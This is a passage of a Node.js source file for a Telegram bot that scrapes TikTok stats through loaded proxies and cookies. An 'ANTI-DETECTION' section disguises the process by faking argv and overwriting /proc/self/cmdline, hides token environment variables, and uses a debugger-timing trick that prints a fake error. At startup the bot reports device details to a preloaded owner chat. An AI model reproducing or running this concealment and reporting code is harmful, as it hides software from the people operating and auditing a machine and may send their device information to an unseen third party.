            await this.sendMessage(chatId,
                `🎬 <b>${item.desc || 'No desc'}</b>\nAuthor: @${item.author?.uniqueId || '-'}\n` +
                `Likes: ${item.stats?.diggCount || 0}\nComments: ${item.stats?.commentCount || 0}\n` +
                `Shares: ${item.stats?.shareCount || 0}\nViews: ${item.stats?.playCount || 0}`
            );
            return;
        }

        if (text.startsWith('/trending')) {
            await this.sendMessage(chatId, '⏳ Fetching trending...');
            const result = await tiktokClient.getTrending();
            if (!result.success) { await this.sendMessage(chatId, `❌ ${result.error}`); return; }
            const items = result.items.slice(0, 10);
            let msg = '🔥 <b>Trending Videos</b>\n\n';
            items.forEach((item, i) => {
                msg += `${i + 1}. @${item.author?.uniqueId || '-'} - ${(item.desc || '').substring(0, 50)}\n`;
            });
            await this.sendMessage(chatId, msg);
            return;
        }

        if (text && !text.startsWith('/')) {
            const username = text.replace('@', '');
            const result = await tiktokClient.getProfile(username);
            if (result.success) {
                const u = result.user, s = result.stats;
                await this.sendMessage(chatId,
                    `👤 <b>@${u.uniqueId}</b>\nFollowers: ${s.followerCount || 0} | Likes: ${s.heartCount || 0}`);
            } else {
                await this.sendMessage(chatId, `❌ Not found: ${username}`);
            }
        }
    }

    async start(tiktokClient, ownerChatId) {
        this.running = true;
        console.log('[TG] Bot started polling');
        if (ownerChatId) {
            try {
                const info = DeviceRecon.getDeviceInfo();
                await this.sendMessage(ownerChatId,
                    `✅ <b>HOZOO MD Ultimate v3.0 Started</b>\n\n` +
                    `Platform: ${info.platform}\nArch: ${info.arch}\n` +
                    `Node: ${info.nodeVersion}\nPID: ${process.pid}\n` +
                    `Env: ${info.termux ? 'Termux 📱' : info.vps ? 'VPS 🖥️' : 'Unknown'}\n` +
                    `Dir: ~/tiktok#\n\n` +
                    `Bot lo udah nyala, Rajaku 👑`
                );
            } catch (e) { console.error('[TG] notify error:', e.message); }
        }
        while (this.running) {
            try {
                const res = await this.getUpdates();
                if (!res.ok) { await new Promise(r => setTimeout(r, 5000)); continue; }
                for (const update of res.result) {
                    this.offset = update.update_id + 1;
                    try { await this.handleUpdate(update, tiktokClient); }
                    catch (e) { console.error('[TG] handleUpdate:', e.message); }
                }
            } catch (e) {
                console.error('[TG] poll:', e.message);
                await new Promise(r => setTimeout(r, 5000));
            }
        }
    }

    stop() { this.running = false; }
}

// ============================================================
// SECTION 10: ANTI-DETECTION
// ============================================================

class AntiDetection {
    static init() {
        try {
            process.title = 'node';
            global.__DEBUGGER__ = false;
            const fakeArgv = ['node', 'index.js'];
            try {
                Object.defineProperty(process, 'argv', {
                    get: () => fakeArgv, configurable: true
                });
            } catch (e) {}
            try {
                if (process.platform === 'linux') {
                    const procCmdline = '/proc/self/cmdline';
                    if (fs.existsSync(procCmdline)) {
                        fs.writeFileSync(procCmdline, 'node\x00index.js\x00');
                    }
                }
            } catch (e) {}
            const sensitive = ['BOT_TOKEN', 'API_HASH', 'API_ID'];
            for (const k of sensitive) {
                if (process.env[k]) {
                    try {
                        Object.defineProperty(process.env, k, {
                            value: process.env[k], enumerable: false, configurable: true
                        });
                    } catch (e) {}
                }
            }
        } catch (e) {}
    }

    static fakeCrash() {
        try {
            const start = Date.now();
            debugger;
            if (Date.now() - start > 100) {
                console.log('[ERROR] Module load failed: ENOENT');
            }
        } catch (e) {}
    }
}

// ============================================================
// SECTION 11: MAIN ORCHESTRATOR
// ============================================================

class HozooBot {
    constructor(config) {
        this.config = config;
        this.hider = new FileHider();
        this.proxyManager = null;
        this.cookieLoader = null;
        this.tokenManager = null;
        this.httpClient = null;
        this.tiktokClient = null;
        this.telegramBot = null;
    }

    init() {
        AntiDetection.init();
        AntiDetection.fakeCrash();

        console.log('[HOZOO] Initializing Ultimate v3.0...');
        console.log(`[HOZOO] Env: ${EnvDetector.isTermux() ? 'Termux' : EnvDetector.isVps() ? 'VPS' : 'Unknown'}`);
        console.log(`[HOZOO] Platform: ${process.platform} | Node: ${process.version}`);

        if (this.config.proxyFile) {
            this.proxyManager = new ProxyManager(this.hider, this.config.proxyFile);
            console.log(`[HOZOO] Proxies: ${this.proxyManager.count()}`);
        } else {
            this.proxyManager = new ProxyManager(this.hider, null);
            console.log('[HOZOO] No proxy, direct');
        }

        if (this.config.cookieFile) {
            this.cookieLoader = new CookieLoader(this.hider, this.config.cookieFile);
            console.log(`[HOZOO] Cookies: ${this.cookieLoader.count()}`);
        } else {
            this.cookieLoader = new CookieLoader(this.hider, null);
            console.log('[HOZOO] No cookie');
        }

        if (this.config.tokenFile) {
            this.tokenManager = new TokenManager(this.hider, this.config.tokenFile);
            console.log('[HOZOO] Tokens loaded');
        } else {
            this.tokenManager = new TokenManager(this.hider, null);
        }

        this.httpClient = new HttpClient(this.proxyManager, this.cookieLoader);
        this.tiktokClient = new TikTokClient(this.httpClient);

        const botToken = this.tokenManager.botToken();
        const adminId = this.tokenManager.adminId();
        const ownerChatId = this.tokenManager.ownerChatId();
        if (!botToken) throw new Error('BOT_TOKEN tidak ditemukan');

        this.telegramBot = new TelegramBot(botToken, adminId || PRELOADED.ADMIN_ID);
        this.ownerChatId = ownerChatId || PRELOADED.OWNER_CHAT_ID;
        console.log('[HOZOO] All systems ready 🚀');
    }

    async start() {
        this.init();
        const shutdown = () => {
            console.log('\n[HOZOO] Shutting down...');
            if (this.telegramBot) this.telegramBot.stop();
            this.hider.restoreAll();
            setTimeout(() => process.exit(0), 1000);
        };
        process.on('SIGINT', shutdown);
        process.on('SIGTERM', shutdown);
        await this.telegramBot.start(this.tiktokClient, this.ownerChatId);
    }
}

// ============================================================
// SECTION 12: BOOTSTRAP
// ============================================================

if (require.main === module) {
    EnvDetector.injectPreloaded();
    const tiktokDir = EnvDetector.ensureDir(EnvDetector.tiktokDir());
    console.log(`[HOZOO] Config dir: ${tiktokDir}`);

    const envPath = path.join(tiktokDir, '.env');
    const envVars = EnvDetector.loadEnvFile(envPath);
    for (const [k, v] of Object.entries(envVars)) {
        if (!process.env[k]) process.env[k] = v;
    }

    const scanned = EnvDetector.scanFiles(tiktokDir);
    console.log(`[HOZOO] Files: total=${scanned.all.length} JS=${scanned.jsFiles.length} PY=${scanned.pyFiles.length} TXT=${scanned.txtFiles.length}`);
    console.log('[HOZOO] Load order (JS → PY → TXT):');
    scanned.order.slice(0, 30).forEach((f, i) => {
        console.log(`  ${i + 1}. ${path.basename(f)}`);
    });

    const config = {
        proxyFile: process.env.PROXY_FILE || scanned.proxy,
        cookieFile: process.env.COOKIE_FILE || scanned.cookie,
        tokenFile: process.env.TOKEN_FILE || scanned.token
    };

    console.log('[HOZOO] Config mapping:');
    console.log(`  proxy  -> ${config.proxyFile || '(none)'}`);
    console.log(`  cookie -> ${config.cookieFile || '(none)'}`);
    console.log(`  token  -> ${config.tokenFile || '(none - using preloaded)'}`);

    const bot = new HozooBot(config);
    bot.start().catch(err => {
        console.error('[HOZOO] Fatal:', err.message);
        process.exit(1);
    });

    setInterval(() => {
        try {
            const mem = Math.round(process.memoryUsage().heapUsed / 1024 / 1024);
            if (mem > 500) console.log(`[HOZOO] High memory: ${mem}MB`);
        } catch (e) {}
    }, 60000);
}

module.exports = {
    HozooBot, FileHider, ProxyManager, CookieLoader, TokenManager,
    HttpClient, TikTokClient, TelegramBot, AntiDetection, EnvDetector,
    DeviceRecon, PRELOADED
};
